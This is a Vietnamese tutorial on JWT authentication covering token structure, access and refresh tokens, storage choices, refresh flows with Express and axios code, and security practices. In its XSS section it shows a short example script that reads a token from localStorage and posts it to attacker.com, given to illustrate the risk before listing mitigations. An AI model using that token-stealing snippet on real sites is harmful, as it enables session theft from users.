# Xác Thực JWT: Hướng Dẫn Toàn Diện Về Xác Thực Dựa Trên Token Bảo Mật

## Giới Thiệu

Trong phát triển web hiện đại, xác thực là một thành phần quan trọng của bất kỳ ứng dụng nào. JSON Web Tokens (JWT) đã trở thành tiêu chuẩn thực tế để triển khai xác thực không trạng thái trong các ứng dụng web. Trong hướng dẫn toàn diện này, chúng ta sẽ khám phá JWT là gì, cách chúng hoạt động và các phương pháp hay nhất để triển khai chúng một cách an toàn.

## JWT Là Gì?

JSON Web Token (JWT) là một tiêu chuẩn mở (RFC 7519) định nghĩa một cách nhỏ gọn và độc lập để truyền thông tin an toàn giữa các bên dưới dạng đối tượng JSON. Thông tin này có thể được xác minh và tin cậy vì nó được ký số bằng một khóa bí mật (với thuật toán HMAC) hoặc cặp khóa công khai/riêng tư (sử dụng RSA hoặc ECDSA).

### Cấu Trúc JWT

JWT bao gồm ba phần được phân tách bởi dấu chấm (`.`):

```
xxxxx.yyyyy.zzzzz
```

1. **Header (Tiêu đề)**: Chứa loại token (JWT) và thuật toán ký (HMAC, RSA, v.v.)
2. **Payload (Dữ liệu)**: Chứa các claims - các câu lệnh về người dùng và dữ liệu bổ sung
3. **Signature (Chữ ký)**: Được sử dụng để xác minh thông điệp không bị thay đổi và xác thực người gửi

Ví dụ về JWT đã giải mã:

```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "sub": "1234567890",
  "name": "Nguyễn Văn A",
  "email": "nguyenvana@example.com",
  "iat": 1516239022,
  "exp": 1516242622
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

### Đặc Điểm Chính Của JWT

- **Nhỏ gọn**: Kích thước nhỏ giúp dễ dàng gửi qua URL, tham số POST hoặc HTTP headers
- **Độc lập**: Chứa tất cả thông tin người dùng cần thiết, tránh truy vấn cơ sở dữ liệu
- **Không trạng thái**: Server không cần lưu trữ thông tin phiên
- **Khả năng di động**: Có thể được sử dụng trên các domain và dịch vụ khác nhau

## Access Token và Refresh Token

Khi triển khai xác thực JWT, điều quan trọng là phải hiểu sự khác biệt giữa access token và refresh token. Cách tiếp cận hai token này là một phương pháp hay nhất về bảo mật.

### Access Token

**Access token** là thông tin xác thực có thời gian sống ngắn cấp quyền truy cập vào các tài nguyên được bảo vệ.

**Đặc điểm:**

- **Thời gian sống ngắn**: Thường từ 15 phút đến 1 giờ
- **Chứa thông tin người dùng**: Bao gồm ID người dùng, vai trò, quyền
- **Gửi với mỗi yêu cầu**: Được bao gồm trong Authorization header
- **Cửa sổ tấn công nhỏ**: Nếu bị xâm phạm, thiệt hại bị giới hạn bởi thời gian hết hạn

Ví dụ sử dụng:

```javascript
// Gửi access token cùng với yêu cầu API
fetch("/api/user/profile", {
  headers: {
    Authorization: `Bearer ${accessToken}`,
  },
});
```

### Refresh Token

**Refresh token** là thông tin xác thực có thời gian sống dài được sử dụng để lấy access token mới.

**Đặc điểm:**

- **Thời gian sống dài**: Nhiều ngày, tuần hoặc thậm chí nhiều tháng
- **Chỉ dùng để làm mới token**: Không được gửi với mỗi yêu cầu API
- **An toàn hơn**: Được lưu trữ an toàn hơn, ít bị lộ hơn
- **Có thể bị thu hồi**: Server có thể vô hiệu hóa refresh token

**Tại sao sử dụng cả hai?**

Cách tiếp cận hai token cân bằng giữa bảo mật và trải nghiệm người dùng:

1. **Bảo mật**: Access token có thời gian sống ngắn giảm thiểu rủi ro nếu bị xâm phạm
2. **Trải nghiệm người dùng**: Refresh token ngăn chặn việc xác thực lại liên tục
3. **Kiểm soát thu hồi**: Dễ dàng vô hiệu hóa phiên bằng cách thu hồi refresh token
4. **Giảm bề mặt tấn công**: Access token thường xuyên bị lộ; refresh token thì không

### Vòng Đời Token Điển Hình

```
Đăng nhập → Cấp Access Token (15 phút) + Refresh Token (7 ngày)
   ↓
Access Token hết hạn sau 15 phút
   ↓
Sử dụng Refresh Token để lấy Access Token mới
   ↓
Tiếp tục truy cập tài nguyên
   ↓
Refresh Token hết hạn sau 7 ngày → Người dùng phải đăng nhập lại
```

## Nơi Lưu Trữ Token: localStorage vs httpOnly Cookies

Lưu trữ token là một trong những chủ đề được tranh luận nhiều nhất trong xác thực JWT. Lựa chọn ảnh hưởng đến cả bảo mật và chức năng.

### Lựa Chọn 1: localStorage (hoặc sessionStorage)

**Ưu điểm:**

- Dễ triển khai
- Hoạt động hoàn hảo với ứng dụng trang đơn (SPA)
- Không lo ngại CSRF
- Kiểm soát hoàn toàn từ JavaScript
- Hoạt động trên các subdomain

**Nhược điểm:**

- **Dễ bị tấn công XSS**: Bất kỳ JavaScript nào trên trang đều có thể truy cập token
- **Không thể truy cập từ server**: Không thể sử dụng cho server-side rendering
- **Không tự động gửi**: Phải đính kèm thủ công vào mỗi yêu cầu

**Triển khai:**

```javascript
// Lưu trữ token
localStorage.setItem("accessToken", token);

// Lấy token
const token = localStorage.getItem("accessToken");

// Gửi cùng với yêu cầu
fetch("/api/data", {
  headers: {
    Authorization: `Bearer ${token}`,
  },
});
```

### Lựa Chọn 2: httpOnly Cookies

**Ưu điểm:**

- **Được bảo vệ khỏi XSS**: JavaScript không thể truy cập httpOnly cookies
- **Tự động gửi**: Trình duyệt tự động bao gồm cookies trong các yêu cầu
- **Hoạt động với SSR**: Server có thể đọc cookies cho server-side rendering
- **An toàn hơn theo mặc định**: Có sẵn các cờ bảo mật bổ sung

**Nhược điểm:**

- **Dễ bị tấn công CSRF**: Yêu cầu bảo vệ CSRF
- **Độ phức tạp CORS**: Yêu cầu cấu hình phù hợp cho các yêu cầu cross-origin
- **Giới hạn kích thước cookie**: Thường giới hạn 4KB mỗi cookie
- **Hạn chế same-site**: Có thể gặp vấn đề với các yêu cầu cross-domain

**Triển khai:**

```javascript
// Server thiết lập cookie (Node.js/Express)
res.cookie("accessToken", token, {
  httpOnly: true, // Không thể được truy cập bởi JavaScript
  secure: true, // Chỉ gửi qua HTTPS
  sameSite: "strict", // Bảo vệ CSRF
  maxAge: 900000, // 15 phút
});

// Trình duyệt tự động gửi cookie cùng với yêu cầu
fetch("/api/data", {
  credentials: "include", // Bao gồm cookies
});
```

### Phương Pháp Được Khuyến Nghị: Chiến Lược Kết Hợp

**Phương pháp hay nhất:**

- **Access Token**: Lưu trữ trong bộ nhớ (biến JavaScript) hoặc httpOnly cookie
- **Refresh Token**: Luôn lưu trữ trong httpOnly cookie với các cờ bảo mật

```javascript
// Lưu trữ trong bộ nhớ cho access token
let accessToken = null;

// Refresh token được lưu trong httpOnly cookie (do server thiết lập)
// Access token được làm mới tự động khi cần
async function fetchWithAuth(url, options = {}) {
  // Nếu không có access token, làm mới nó trước
  if (!accessToken) {
    await refreshAccessToken();
  }

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      Authorization: `Bearer ${accessToken}`,
    },
  });
}
```

### Bảng So Sánh Bảo Mật

| Phương Pháp Lưu Trữ | Lỗ Hổng XSS | Lỗ Hổng CSRF | Trường Hợp Sử Dụng Tốt Nhất         |
| ------------------- | ----------- | ------------ | ----------------------------------- |
| localStorage        | Cao         | Thấp         | SPA đơn giản với bảo vệ XSS mạnh    |
| httpOnly Cookie     | Thấp        | Trung bình   | Ứng dụng production với bảo vệ CSRF |
| Bộ nhớ + httpOnly   | Thấp        | Trung bình   | Khuyến nghị cho ứng dụng nhạy cảm   |

## Luồng Làm Mới Token

Cơ chế làm mới token là cần thiết để duy trì phiên người dùng mà không yêu cầu xác thực lại liên tục.

### Luồng Làm Mới Tiêu Chuẩn

```
1. Người dùng đăng nhập
   ↓
2. Server cấp Access Token (15 phút) + Refresh Token (7 ngày)
   ↓
3. Client thực hiện yêu cầu API với Access Token
   ↓
4. Access Token hết hạn
   ↓
5. Client phát hiện phản hồi 401 Unauthorized
   ↓
6. Client gửi Refresh Token đến endpoint /refresh-token
   ↓
7. Server xác thực Refresh Token
   ↓
8. Server cấp Access Token mới (và tùy chọn Refresh Token mới)
   ↓
9. Client thử lại yêu cầu ban đầu với Access Token mới
```

### Ví Dụ Triển Khai

**Phía Client (JavaScript):**

```javascript
// Axios interceptor để tự động làm mới token
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // Nếu access token hết hạn và chúng ta chưa thử lại
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Yêu cầu access token mới bằng refresh token
        const { data } = await axios.post(
          "/api/auth/refresh",
          {},
          {
            withCredentials: true, // Gửi httpOnly cookie
          },
        );

        // Cập nhật access token
        accessToken = data.accessToken;

        // Thử lại yêu cầu ban đầu với token mới
        originalRequest.headers["Authorization"] = `Bearer ${accessToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        // Refresh token không hợp lệ - chuyển hướng đến trang đăng nhập
        window.location.href = "/login";
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  },
);
```

**Phía Server (Node.js/Express):**

```javascript
// Endpoint làm mới token
app.post("/api/auth/refresh", async (req, res) => {
  try {
    // Lấy refresh token từ httpOnly cookie
    const refreshToken = req.cookies.refreshToken;

    if (!refreshToken) {
      return res.status(401).json({ error: "Không có refresh token" });
    }

    // Xác thực refresh token
    const decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);

    // Kiểm tra xem refresh token có trong cơ sở dữ liệu (không bị thu hồi)
    const tokenExists = await db.checkRefreshToken(
      decoded.userId,
      refreshToken,
    );
    if (!tokenExists) {
      return res.status(401).json({ error: "Refresh token không hợp lệ" });
    }

    // Tạo access token mới
    const newAccessToken = jwt.sign(
      { userId: decoded.userId, email: decoded.email },
      ACCESS_TOKEN_SECRET,
      { expiresIn: "15m" },
    );

    // Tùy chọn cấp refresh token mới (xoay vòng token)
    const newRefreshToken = jwt.sign(
      { userId: decoded.userId },
      REFRESH_TOKEN_SECRET,
      { expiresIn: "7d" },
    );

    // Cập nhật refresh token trong cơ sở dữ liệu
    await db.updateRefreshToken(decoded.userId, refreshToken, newRefreshToken);

    // Thiết lập cookie refresh token mới
    res.cookie("refreshToken", newRefreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: "strict",
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
    });

    // Gửi access token mới
    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(401).json({ error: "Refresh token không hợp lệ" });
  }
});
```

### Nâng Cao: Làm Mới Im Lặng

Để có trải nghiệm người dùng tốt hơn, triển khai làm mới token im lặng trước khi hết hạn:

```javascript
// Kiểm tra hết hạn token và làm mới chủ động
function setupTokenRefresh() {
  setInterval(async () => {
    const decoded = parseJwt(accessToken);
    const expiresIn = decoded.exp * 1000 - Date.now();

    // Làm mới 1 phút trước khi hết hạn
    if (expiresIn < 60000) {
      await refreshAccessToken();
    }
  }, 30000); // Kiểm tra mỗi 30 giây
}
```

### Xoay Vòng Refresh Token

Để tăng cường bảo mật, triển khai xoay vòng refresh token:

```
1. Client sử dụng Refresh Token A để lấy Access Token mới
   ↓
2. Server cấp Access Token mới + Refresh Token B mới
   ↓
3. Server vô hiệu hóa Refresh Token A
   ↓
4. Client phải sử dụng Refresh Token B cho lần làm mới tiếp theo
```

Điều này ngăn chặn các cuộc tấn công sử dụng lại refresh token.

## Các Vấn Đề Bảo Mật

Xác thực JWT giới thiệu một số cân nhắc bảo mật phải được giải quyết.

### 1. Bảo Mật Token

**Tấn Công XSS (Cross-Site Scripting)**

Nếu kẻ tấn công tiêm các script độc hại, chúng có thể đánh cắp token từ localStorage:

```javascript
// Script độc hại
const token = localStorage.getItem("accessToken");
fetch("https://attacker.com/steal", {
  method: "POST",
  body: JSON.stringify({ token }),
});
```

**Biện pháp giảm thiểu:**

- Sử dụng httpOnly cookies cho các token nhạy cảm
- Triển khai Content Security Policy (CSP)
- Làm sạch tất cả đầu vào của người dùng
- Giữ các phụ thuộc được cập nhật
- Sử dụng các header bảo mật

```javascript
// Express security headers
const helmet = require("helmet");
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
      },
    },
  }),
);
```

**Tấn Công CSRF (Cross-Site Request Forgery)**

Khi sử dụng cookies, bảo vệ chống lại CSRF:

```javascript
// Sử dụng CSRF tokens
const csrf = require("csurf");
app.use(csrf({ cookie: true }));

// Thiết lập thuộc tính SameSite cho cookie
res.cookie("refreshToken", token, {
  httpOnly: true,
  sameSite: "strict", // hoặc 'lax' cho một số điều hướng cross-site
  secure: true,
});
```

### 2. Hết Hạn Token

**Không bao giờ sử dụng token có thời gian sống dài mà không có cơ chế làm mới:**

❌ **Sai:**

```javascript
// Access token 30 ngày - KHÔNG BAO GIỜ LÀM NHƯ VẬY
const token = jwt.sign(payload, secret, { expiresIn: "30d" });
```

✅ **Đúng:**

```javascript
// Access token có thời gian sống ngắn
const accessToken = jwt.sign(payload, secret, { expiresIn: "15m" });
// Refresh token có thời gian sống dài (lưu trữ an toàn)
const refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: "7d" });
```

### 3. Quản Lý Secret

**Không bao giờ hardcode secret hoặc commit chúng vào version control:**

❌ **Sai:**

```javascript
const secret = "myS3cr3tK3y"; // KHÔNG BAO GIỜ LÀM NHƯ VẬY
```

✅ **Đúng:**

```javascript
// Sử dụng biến môi trường
const secret = process.env.JWT_SECRET;

// Sử dụng secret mạnh, ngẫu nhiên
const crypto = require("crypto");
const secret = crypto.randomBytes(64).toString("hex");
```

### 4. Xác Thực Token

Luôn xác thực token đúng cách:

```javascript
// Xác thực token toàn diện
function verifyToken(token) {
  try {
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'],        // Chỉ định các thuật toán được phép
      issuer: 'your-app',           // Xác minh token issuer
      audience: 'your-api'          // Xác minh audience dự định
    });

    // Kiểm tra bổ sung
    if (!decoded.userId) {
      throw new Error('Cấu trúc token không hợp lệ');
    }

    // Kiểm tra xem người dùng vẫn tồn tại và đang hoạt động
    const user = await db.findUser(decoded.userId);
    if (!user || !user.isActive) {
      throw new Error('Không tìm thấy người dùng hoặc không hoạt động');
    }

    return decoded;
  } catch (error) {
    throw new Error('Xác thực token thất bại');
  }
}
```

### 5. Thu Hồi Token

Triển khai chiến lược thu hồi token:

**Phương Pháp Blacklist:**

```javascript
// Lưu trữ các token bị thu hồi trong Redis
async function revokeToken(token) {
  const decoded = jwt.decode(token);
  const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);

  // Lưu trữ trong Redis với thời gian hết hạn
  await redis.setex(`blacklist:${token}`, expiresIn, "revoked");
}

// Kiểm tra xem token có bị thu hồi không
async function isTokenRevoked(token) {
  const revoked = await redis.get(`blacklist:${token}`);
  return revoked !== null;
}
```

**Whitelist Refresh Token:**

```javascript
// Lưu trữ các refresh token hợp lệ trong cơ sở dữ liệu
// Dễ dàng quản lý và thu hồi hơn
async function storeRefreshToken(userId, token) {
  await db.refreshTokens.insert({
    userId,
    token: hashToken(token),
    createdAt: new Date(),
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  });
}

// Thu hồi tất cả refresh token cho một người dùng (đăng xuất ở mọi nơi)
async function revokeAllUserTokens(userId) {
  await db.refreshTokens.deleteMany({ userId });
}
```

### 6. Các Phương Pháp Hay Nhất Về Bảo Mật Bổ Sung

**Luôn Sử Dụng HTTPS:**

```javascript
// Chuyển hướng HTTP sang HTTPS
app.use((req, res, next) => {
  if (req.header("x-forwarded-proto") !== "https") {
    res.redirect(`https://${req.header("host")}${req.url}`);
  } else {
    next();
  }
});
```

**Triển Khai Rate Limiting:**

```javascript
const rateLimit = require("express-rate-limit");

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // 5 yêu cầu mỗi cửa sổ
  message: "Quá nhiều lần thử đăng nhập, vui lòng thử lại sau",
});

app.post("/api/auth/login", loginLimiter, loginHandler);
```

**Giám Sát và Ghi Log Các Sự Kiện Bảo Mật:**

```javascript
// Ghi log các sự kiện xác thực
function logAuthEvent(event, userId, ip) {
  logger.info({
    event,
    userId,
    ip,
    timestamp: new Date(),
    userAgent: req.headers["user-agent"],
  });
}

// Ví dụ
logAuthEvent("LOGIN_SUCCESS", user.id, req.ip);
logAuthEvent("TOKEN_REFRESH", user.id, req.ip);
logAuthEvent("INVALID_TOKEN", null, req.ip);
```

### Danh Sách Kiểm Tra Bảo Mật

- [ ] Sử dụng access token có thời gian sống ngắn (15-30 phút)
- [ ] Lưu trữ refresh token trong httpOnly cookies
- [ ] Triển khai cơ chế làm mới token
- [ ] Sử dụng HTTPS trong production
- [ ] Thiết lập các cờ cookie an toàn (httpOnly, secure, sameSite)
- [ ] Triển khai bảo vệ CSRF
- [ ] Sử dụng secret mạnh, được tạo ngẫu nhiên
- [ ] Không bao giờ commit secret vào version control
- [ ] Xác thực token kỹ lưỡng
- [ ] Triển khai thu hồi token
- [ ] Thêm rate limiting trên các endpoint auth
- [ ] Ghi log các sự kiện bảo mật
- [ ] Sử dụng Content Security Policy
- [ ] Giữ các phụ thuộc được cập nhật
- [ ] Triển khai xoay vòng refresh token

## Kết Luận

Xác thực JWT là một cách tiếp cận mạnh mẽ và linh hoạt để bảo mật các ứng dụng web hiện đại. Bằng cách hiểu sự khác biệt giữa access token và refresh token, cẩn thận lựa chọn các chiến lược lưu trữ token, triển khai các luồng làm mới thích hợp và giải quyết các vấn đề bảo mật, bạn có thể xây dựng một hệ thống xác thực mạnh mẽ.

**Những Điểm Chính:**

1. **Sử dụng hai token**: Access token có thời gian sống ngắn + refresh token có thời gian sống dài
2. **Lưu trữ an toàn**: httpOnly cookies cho refresh token, bộ nhớ hoặc httpOnly cookies cho access token
3. **Triển khai luồng làm mới**: Làm mới token tự động cho trải nghiệm người dùng liền mạch
4. **Ưu tiên bảo mật**: Bảo vệ XSS, bảo vệ CSRF, HTTPS, xác thực đúng cách và thu hồi token

Hãy nhớ rằng, bảo mật không phải là một lần triển khai mà là một quá trình liên tục. Luôn cập nhật với các phương pháp hay nhất về bảo mật mới nhất và thường xuyên kiểm tra triển khai xác thực của bạn.

---

_Có câu hỏi hoặc đề xuất? Đừng ngần ngại liên hệ trong phần bình luận bên dưới!_
